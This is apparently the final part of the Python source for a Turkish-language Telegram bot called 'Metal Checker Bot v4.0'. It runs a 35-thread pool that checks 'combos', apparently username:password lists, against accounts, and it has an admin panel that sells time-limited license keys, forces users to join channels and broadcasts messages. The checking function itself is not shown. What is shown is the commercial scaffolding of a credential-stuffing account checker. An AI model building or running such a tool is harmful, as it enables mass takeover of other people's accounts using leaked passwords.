        init_msg = bot.send_message(chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
        context.message_id = init_msg.message_id

        threading.Thread(target=live_ui_updater, args=(context,), daemon=True).start()
        
        def run_executor():
            with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
                futures = [executor.submit(check_account_bot, context, combo) for combo in combos]
                concurrent.futures.wait(futures)
        
        threading.Thread(target=run_executor, daemon=True).start()

# ==========================================
# 👑 ADMIN PANEL LOGIC
# ==========================================
def send_admin_panel(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("➕ Kanal Ekle", callback_data="adm_add_channel"),
               types.InlineKeyboardButton("➖ Kanal Çıkar", callback_data="adm_rem_channel"))
    markup.row(types.InlineKeyboardButton("🔑 Key Üret", callback_data="adm_gen_key"))
    markup.row(types.InlineKeyboardButton("👤 Admin Ekle", callback_data="adm_add_admin"),
               types.InlineKeyboardButton("❌ Admin Çıkar", callback_data="adm_rem_admin"))
    markup.row(types.InlineKeyboardButton("📢 Broadcast (Toplu Mesaj)", callback_data="adm_broadcast"))
    bot.send_message(chat_id, "👑 *Metal Checker Admin Yönetim Paneli*", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id

    if call.data.startswith("set_lang_"):
        lang = call.data.split("_")[2]
        db["users"][str(user_id)]["lang"] = lang
        save_db()
        bot.answer_callback_query(call.id, "Language/Dil güncellendi!")
        bot.send_message(chat_id, get_text(user_id, "main_menu"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
        return

    if call.data == "check_joined":
        if check_force_join(user_id):
            bot.send_message(chat_id, "✅ Doğrulama başarılı!", reply_markup=main_keyboard(user_id))
        else:
            send_force_join_msg(chat_id, user_id)
        return

    if user_id not in db["admins"]:
        bot.answer_callback_query(call.id, "Yetkiniz yok!")
        return

    if call.data == "adm_add_channel":
        msg = bot.send_message(chat_id, "Lütfen eklemek istediğiniz kanal ID'sini veya username girin:")
        bot.register_next_step_handler(msg, process_add_channel)
    elif call.data == "adm_rem_channel":
        if not db["channels"]:
            bot.send_message(chat_id, "Kayıtlı kanal yok.")
            return
        markup = types.InlineKeyboardMarkup()
        for ch in db["channels"]:
            markup.row(types.InlineKeyboardButton(str(ch), callback_data=f"del_ch_{ch}"))
        bot.send_message(chat_id, "Çıkarmak istediğiniz kanalı seçin:", reply_markup=markup)
    elif call.data.startswith("del_ch_"):
        ch = call.data.replace("del_ch_", "")
        if ch in db["channels"]: db["channels"].remove(ch); save_db()
        bot.send_message(chat_id, "Kanal çıkarıldı!")
    elif call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("1 Gün", callback_data="gk_1"), types.InlineKeyboardButton("3 Gün", callback_data="gk_3"))
        markup.row(types.InlineKeyboardButton("1 Hafta", callback_data="gk_7"), types.InlineKeyboardButton("1 Ay", callback_data="gk_30"))
        markup.row(types.InlineKeyboardButton("3 Ay", callback_data="gk_90"), types.InlineKeyboardButton("Sonsuz", callback_data="gk_99999"))
        markup.row(types.InlineKeyboardButton("Özel Gün (Custom)", callback_data="gk_custom"))
        bot.send_message(chat_id, "Key süresi seçin:", reply_markup=markup)
    elif call.data.startswith("gk_"):
        duration = call.data.split("_")[1]
        if duration == "custom":
            msg = bot.send_message(chat_id, "Lütfen gün sayısını tam sayı olarak girin:")
            bot.register_next_step_handler(msg, process_custom_key)
        else:
            generate_key_and_send(chat_id, int(duration))
    elif call.data == "adm_add_admin":
        if user_id != OWNER_ID:
            bot.send_message(chat_id, "❌ Bu işlemi sadece ana kurucu (Owner) yapabilir.")
            return
        msg = bot.send_message(chat_id, "Eklenecek Adminin Telegram ID'sini girin:")
        bot.register_next_step_handler(msg, process_add_admin)
    elif call.data == "adm_rem_admin":
        if user_id != OWNER_ID:
            bot.send_message(chat_id, "❌ Bu işlemi sadece ana kurucu (Owner) yapabilir.")
            return
        msg = bot.send_message(chat_id, "Çıkarılacak Adminin Telegram ID'sini girin:")
        bot.register_next_step_handler(msg, process_rem_admin)
    elif call.data == "adm_broadcast":
        msg = bot.send_message(chat_id, "Tüm kullanıcılara gönderilecek mesaj metnini yazın:")
        bot.register_next_step_handler(msg, process_broadcast)

def process_add_channel(message):
    db["channels"].append(message.text.strip())
    save_db()
    bot.send_message(message.chat.id, "✅ Kanal başarıyla zorunlu kanallara eklendi!")

def generate_key_and_send(chat_id, days):
    new_key = str(uuid.uuid4())
    tier_map = {1: "DAILY", 3: "3-DAYS", 7: "WEEKLY", 30: "MONTHLY", 90: "3-MONTHS", 99999: "INFINITE"}
    tier = tier_map.get(days, f"{days}-DAYS")
    db["keys"][new_key] = {"days": days, "tier": tier}
    save_db()
    bot.send_message(chat_id, f"🔑 *Yeni Anahtar Üretildi ({tier}):*\n`{new_key}`", parse_mode="Markdown")

def process_custom_key(message):
    try:
        days = int(message.text.strip())
        generate_key_and_send(message.chat.id, days)
    except:
        bot.send_message(message.chat.id, "❌ Geçersiz gün sayısı.")

def process_add_admin(message):
    try:
        target = int(message.text.strip())
        if target not in db["admins"]:
            db["admins"].append(target)
            save_db()
            bot.send_message(message.chat.id, "✅ Yeni admin başarıyla eklendi!")
        else:
            bot.send_message(message.chat.id, "❌ Bu kullanıcı zaten admin.")
    except:
        bot.send_message(message.chat.id, "❌ Geçersiz ID.")

def process_rem_admin(message):
    try:
        target = int(message.text.strip())
        if target == OWNER_ID:
            bot.send_message(message.chat.id, "❌ Kurucuyu adminden çıkaramazsınız.")
            return
        if target in db["admins"]:
            db["admins"].remove(target)
            save_db()
            bot.send_message(message.chat.id, "✅ Admin başarıyla yetkiden çıkarıldı!")
        else:
            bot.send_message(message.chat.id, "❌ Kullanıcı admin listesinde bulunamadı.")
    except:
        bot.send_message(message.chat.id, "❌ Geçersiz ID.")

def process_broadcast(message):
    text = message.text
    count = 0
    for uid in db["users"].keys():
        try:
            bot.send_message(int(uid), text)
            count += 1
            time.sleep(0.05)
        except:
            pass
    bot.send_message(message.chat.id, f"📢 Mesaj {count} kişiye başarıyla iletildi.")

if __name__ == "__main__":
    print("🤖 Metal Checker Bot v4.0 Online.")
    try:
        bot.remove_webhook()
    except:
        pass
    time.sleep(1) 
    bot.infinity_polling(skip_pending=True)
